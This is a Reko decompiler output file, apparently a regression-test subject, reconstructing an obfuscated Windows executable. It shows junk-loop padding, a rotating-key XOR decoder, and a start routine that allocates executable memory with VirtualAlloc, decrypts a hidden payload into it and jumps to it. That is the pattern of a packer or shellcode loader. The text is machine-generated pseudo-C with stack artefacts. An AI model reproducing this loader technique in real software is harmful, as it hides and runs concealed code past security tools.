// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: FlagGroup Eq_2 fn13101000(Register ptr32 ecx, Stack word32 dwArg04, Stack (ptr byte) dwArg08, Stack word32 dwArg0C, Stack (ptr word32) dwArg10, Stack word32 dwArg14, Stack (arr Eq_116) dwArg18)
Eq_2 fn13101000(ptr32 ecx, word32 dwArg04, byte * dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, Eq_116 dwArg18[])
{
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	*dwArg10 = dwArg0C;
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	uint64 edx_eax_223 = (uint64) (uint32) dwArg14;
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	word16 dx_287 = (word16) (uint32) (edx_eax_223 % 0x05);
	do
		;
	while (~0x00C0050F == 0x00);
	word16 wLoc0C_1146 = dx_287;
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	byte * edx_381 = dwArg04 + dwArg14;
	do
		;
	while (~0x00C0050F == 0x00);
	byte * dwArg04_1404 = edx_381;
	do
		;
	while (~0x00C0050F == 0x00);
	while (true)
	{
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		Eq_2 dwLoc14_592 = false;
		do
			;
		while (~0x00C0050F == 0x00);
		if (!dwLoc14_592)
			break;
		do
			;
		while (~0x00C0050F == 0x00);
		byte al_745 = *dwArg04_1404;
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		int32 ecx_806 = (int32) wLoc0C_1146;
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		word32 eax_867 = (word32) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&dwArg18[ecx_806].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
		do
			;
		while (~0x00C0050F == 0x00);
		int32 ecx_899 = (int32) al_745;
		do
			;
		while (~0x00C0050F == 0x00);
		ui32 ecx_928 = ecx_899 ^ eax_867;
		do
			;
		while (~0x00C0050F == 0x00);
		byte cl_954 = (byte) ecx_928;
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		*dwArg08 = cl_954;
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		word16 cx_1113 = wLoc0C_1146 + 0x01;
		do
			;
		while (~0x00C0050F == 0x00);
		wLoc0C_1146 = cx_1113;
		do
			;
		while (~0x00C0050F == 0x00);
		int32 edx_1175 = (int32) cx_1113;
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		if (edx_1175 == 0x05)
		{
			do
				;
			while (~0x00C0050F == 0x00);
			wLoc0C_1146 = 0x00;
			do
				;
			while (~0x00C0050F == 0x00);
		}
		do
			;
		while (~0x00C0050F == 0x00);
		byte * ecx_1280 = dwArg08 + 0x01;
		do
			;
		while (~0x00C0050F == 0x00);
		dwArg08 = ecx_1280;
		do
			;
		while (~0x00C0050F == 0x00);
		do
			;
		while (~0x00C0050F == 0x00);
		byte * edx_1371 = dwArg04_1404 + 0x01;
		do
			;
		while (~0x00C0050F == 0x00);
		dwArg04_1404 = edx_1371;
		do
			;
		while (~0x00C0050F == 0x00);
	}
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	do
		;
	while (~0x00C0050F == 0x00);
	return dwLoc14_592;
}

// 13101659: Register Eq_201 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	ptr32 esp_17 = fp - 0x0280;
	Eq_206 eax_19 = GetActiveObject(null, (void *) 0x47, (IUnknown **) 0x17);
	if (eax_19 != (struct <anonymous> *) 0x80070057)
	{
		word32 ebp_530;
		byte SCZO_531;
		word32 eax_532;
		byte Z_533;
		word32 ecx_534;
		word32 edx_535;
		byte SCZDOP_536;
		byte SZO_538;
		byte C_539;
		byte dl_540;
		byte DP_541;
		eax_19->ptr0000();
	}
	word32 ecx_45 = globals->dw131022BC;
	LPCSTR * esp_48 = esp_17 - 0x04;
	*esp_48 = (LPCSTR *) (fp - 0x0234);
	*(esp_48 - 0x04) = 0x00;
	*(esp_48 - 0x08) = fp - 0x04;
	*(esp_48 - 0x0C) = (union Eq_242 *) cond(fp);
	*(esp_48 - 0x10) = ecx_45;
	do
		;
	while (~0x00C0050F == 0x00);
	*(esp_48 - 0x14) = edi;
	word32 edi_71 = *(esp_48 - 0x14);
	word32 ecx_73 = *(esp_48 - 0x10);
	Eq_287 SCZDOP_75 = *(esp_48 - 0x0C);
	word32 ebp_78 = *(esp_48 - 0x08);
	*(esp_48 - 0x08) = ebp_78;
	*(esp_48 - 0x0C) = (union Eq_287 *) SCZDOP_75;
	*(esp_48 - 0x10) = ecx_73;
	do
		;
	while (~0x00C0050F == 0x00);
	*(esp_48 - 0x14) = edi_71;
	word32 edi_100 = *(esp_48 - 0x14);
	word32 ecx_102 = *(esp_48 - 0x10);
	Eq_333 SCZDOP_104 = *(esp_48 - 0x0C);
	word32 ebp_107 = *(esp_48 - 0x08);
	*(esp_48 - 0x08) = ebp_78 - 0x0C;
	*(esp_48 - 0x0C) = ebp_107;
	*(esp_48 - 0x10) = (union Eq_333 *) SCZDOP_104;
	*(esp_48 - 0x14) = ecx_102;
	do
		;
	while (~0x00C0050F == 0x00);
	*(esp_48 - 0x18) = edi_100;
	word32 edi_130 = *(esp_48 - 0x18);
	word32 ecx_132 = *(esp_48 - 0x14);
	Eq_386 SCZDOP_134 = *(esp_48 - 0x10);
	word32 ebp_137 = *(esp_48 - 0x0C);
	*(esp_48 - 0x0C) = 0x04;
	*(esp_48 - 0x10) = ebp_137;
	*(esp_48 - 0x14) = (union Eq_386 *) SCZDOP_134;
	*(esp_48 - 0x18) = ecx_132;
	do
		;
	while (~0x00C0050F == 0x00);
	*(esp_48 - 0x1C) = edi_130;
	ptr32 ebp_166 = *(esp_48 - 0x10);
	*(esp_48 - 0x10) = ebp_166 - 0x24;
	*(esp_48 - 0x14) = ebp_166 - 0x24;
	fn13101000(ebp_166 - 0x24, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(ebp_166 - 0x0254) = *((char *) *(ebp_166 - 0x023C) + 0x04);
	*esp_48 = (LPCSTR *) (ebp_166 - 0x0230);
	*(esp_48 - 0x04) = 0x04;
	*(esp_48 - 0x08) = ebp_166 - 0x0C;
	*(esp_48 - 0x0C) = 0x04;
	*(esp_48 - 0x10) = ebp_166 - 0x0254;
	*(esp_48 - 0x14) = ebp_166 - 600;
	fn13101000(ebp_166 - 0x0254, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(ebp_166 - 0x10) = *((char *) *(ebp_166 - 0x023C) + 0x08);
	*esp_48 = (LPCSTR *) (ebp_166 - 0x0230);
	*(esp_48 - 0x04) = 0x08;
	*(esp_48 - 0x08) = ebp_166 - 0x0C;
	*(esp_48 - 0x0C) = 0x04;
	*(esp_48 - 0x10) = ebp_166 - 0x10;
	*(esp_48 - 0x14) = ebp_166 - 0x18;
	fn13101000(ebp_166 - 0x10, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(ebp_166 - 0x20) = *(ebp_166 - 0x023C) + 0x0C;
	*esp_48 = (LPCSTR *) null;
	*(ebp_166 - 0x1C) = (HMODULE *) GetModuleHandleA(*esp_48);
	*(ebp_166 - 0x0250) = *(ebp_166 - 0x1C) + 0x1000;
	*(ebp_166 - 588) = 0x0C;
	*(ebp_166 - 0x18) = **(ebp_166 - 0x20);
	*(esp_48 - 0x04) = ebp_166 - 0x0230;
	*(esp_48 - 0x08) = *(ebp_166 - 588);
	*(esp_48 - 0x0C) = ebp_166 - 0x0C;
	*(esp_48 - 0x10) = 0x04;
	*(esp_48 - 0x14) = ebp_166 - 0x18;
	*(esp_48 - 0x18) = ebp_166 - 0x18 - *(ebp_166 - 588);
	fn13101000(ebp_166 - 0x18, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(ebp_166 - 0x18) = *(ebp_166 - 0x18) + *(ebp_166 - 0x1C);
	*(ebp_166 - 588) = *(ebp_166 - 588) + 0x04;
	*(ebp_166 - 0x20) = *(ebp_166 - 0x20) + 0x04;
	*(ebp_166 - 0x0244) = **(ebp_166 - 0x20);
	*(esp_48 - 0x04) = ebp_166 - 0x0230;
	*(esp_48 - 0x08) = *(ebp_166 - 588);
	*(esp_48 - 0x0C) = ebp_166 - 0x0C;
	*(esp_48 - 0x10) = 0x04;
	*(esp_48 - 0x14) = ebp_166 - 0x0244;
	*(esp_48 - 0x18) = ebp_166 - 0x0244 - *(ebp_166 - 588);
	fn13101000(ebp_166 - 0x0C, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(ebp_166 - 588) = *(ebp_166 - 588) + 0x04;
	*(ebp_166 - 0x20) = *(ebp_166 - 0x20) + 0x04;
	*(ebp_166 - 0x28) = *(ebp_166 - 0x10) * 0x08 + 0x0C;
	*(esp_48 - 0x04) = 0x40;
	*(esp_48 - 0x08) = 0x3000;
	*(esp_48 - 0x0C) = *(ebp_166 - 0x28) + *(ebp_166 - 0x0254) + *(ebp_166 - 0x24);
	*(esp_48 - 0x10) = 0x00;
	*(ebp_166 - 0x0238) = (LPVOID *) VirtualAlloc(*(esp_48 - 0x10), *(esp_48 - 0x0C), *(esp_48 - 0x08), *(esp_48 - 0x04));
	*(ebp_166 - 0x08) = *(ebp_166 - 0x18) + *(ebp_166 - 0x28);
	*(ebp_166 - 0x0240) = *(ebp_166 - 0x28);
	*(ebp_166 - 0x0260) = *(ebp_166 - 0x0240);
	*(ebp_166 - 0x04) = 0x00;
	*(ebp_166 - 0x14) = 0x00;
	while (true)
	{
		ptr32 esp_336 = esp_17 - 0x14;
		if (0x01 == 0x00)
			break;
		if (*(ebp_166 - 0x0260) == *(ebp_166 - 0x0244))
		{
			*(ebp_166 - 0x04) = *(ebp_166 - 0x04) + 0x01;
			if (*(ebp_166 - 0x04) == *(ebp_166 - 0x10))
				break;
			*(ebp_166 - 0x18) = **(ebp_166 - 0x20);
			*(esp_336 - 0x04) = ebp_166 - 0x0230;
			*(esp_336 - 0x08) = *(ebp_166 - 588);
			*(esp_336 - 0x0C) = ebp_166 - 0x0C;
			*(esp_336 - 0x10) = 0x04;
			*(esp_336 - 0x14) = ebp_166 - 0x18;
			ptr32 ecx_466 = ebp_166 - 0x18 - *(ebp_166 - 588);
			*(esp_336 - 0x18) = ecx_466;
			fn13101000(ecx_466, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			*(ebp_166 - 0x18) = *(ebp_166 - 0x18) + *(ebp_166 - 0x1C);
			*(ebp_166 - 588) = *(ebp_166 - 588) + 0x04;
			*(ebp_166 - 0x20) = *(ebp_166 - 0x20) + 0x04;
			*(ebp_166 - 0x0244) = **(ebp_166 - 0x20);
			*(esp_336 - 0x04) = ebp_166 - 0x0230;
			*(esp_336 - 0x08) = *(ebp_166 - 588);
			*(esp_336 - 0x0C) = ebp_166 - 0x0C;
			*(esp_336 - 0x10) = 0x04;
			*(esp_336 - 0x14) = ebp_166 - 0x0244;
			*(esp_336 - 0x18) = ebp_166 - 0x0244 - *(ebp_166 - 588);
			fn13101000(ebp_166 - 0x0244, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			*(ebp_166 - 588) = *(ebp_166 - 588) + 0x04;
			*(ebp_166 - 0x20) = *(ebp_166 - 0x20) + 0x04;
			*(ebp_166 - 0x0260) = 0x00;
			*(ebp_166 - 0x08) = *(ebp_166 - 0x18);
		}
		*(ebp_166 - 0x0238) + *(ebp_166 - 0x14) = (byte *) **(ebp_166 - 0x08);
		*(ebp_166 - 0x08) = *(ebp_166 - 0x08) + 0x01;
		*(ebp_166 - 0x14) = *(ebp_166 - 0x14) + 0x01;
		*(ebp_166 - 0x0260) = *(ebp_166 - 0x0260) + 0x01;
		*(ebp_166 - 0x0240) = *(ebp_166 - 0x0240) + 0x01;
	}
	*(esp_336 - 0x04) = ebp_166 - 0x0230;
	*(esp_336 - 0x08) = *(ebp_166 - 0x28);
	*(esp_336 - 0x0C) = ebp_166 - 0x0234;
	ptr32 ecx_352 = *(ebp_166 - 0x0254);
	*(esp_336 - 0x10) = ecx_352;
	*(esp_336 - 0x14) = *(ebp_166 - 0x0238);
	*(esp_336 - 0x18) = *(ebp_166 - 0x0238) - *(ebp_166 - 0x28);
	byte DP_363 = fn13101000(ecx_352, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(ebp_166 - 0x0248) = *(ebp_166 - 0x0238) + 0x0F50;
	*(ebp_166 - 0x0264) = *(ebp_166 - 0x0248);
	*(esp_336 - 0x04) = *(ebp_166 - 0x025C);
	*(esp_336 - 0x08) = ebp_166 - 0x0230;
	*(esp_336 - 0x0C) = *(ebp_166 - 0x0254);
	word32 eax_379 = *(ebp_166 - 0x24);
	*(esp_336 - 0x10) = eax_379;
	word32 ecx_382 = *(ebp_166 - 0x0238);
	*(esp_336 - 0x14) = ecx_382;
	word32 edx_386 = *(ebp_166 - 0x0238) + *(ebp_166 - 0x0254);
	*(esp_336 - 0x18) = edx_386;
	word32 esp_390;
	word32 ebp_391;
	byte SCZO_392;
	word32 eax_393;
	byte Z_394;
	word32 ecx_395;
	word32 edx_396;
	byte SCZDOP_397;
	word32 edi_398;
	byte SZO_399;
	byte C_400;
	byte dl_401;
	byte DP_402;
	(*(ebp_166 - 0x0264))();
	return 0x00;
}

